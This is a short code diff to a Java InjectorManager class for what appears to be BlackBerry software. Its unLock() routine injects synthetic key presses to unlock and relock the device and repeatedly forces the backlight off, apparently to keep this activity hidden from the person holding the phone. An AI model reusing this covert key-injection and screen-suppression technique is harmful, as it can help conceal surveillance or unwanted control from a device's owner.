@@ -281,11 +281,11 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
      */
     private void unLock() {
         //#ifdef DEBUG
-        debug.trace("unLock");
+        debug.trace("unLock: " + ApplicationManager.getApplicationManager().isSystemLocked());
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
-        Utils.sleep(200);
+        Utils.sleep(100);
 
         if (status.backlightEnabled()) {
             //#ifdef DEBUG
@@ -294,9 +294,12 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             //#endif
 
             KeyInjector.pressRawKeyCode(Keypad.KEY_SPEAKERPHONE);
-            Utils.sleep(200);
+            Utils.sleep(100);
             KeyInjector.pressRawKeyCode(KEY_LOCK);
-            Utils.sleep(200);
+            status.setBacklight(false);
+            Utils.sleep(100);
+            status.setBacklight(false);
+            Utils.sleep(100);
             status.setBacklight(false);
             Utils.sleep(500);
             for (int i = 0; i < 10; i++) {
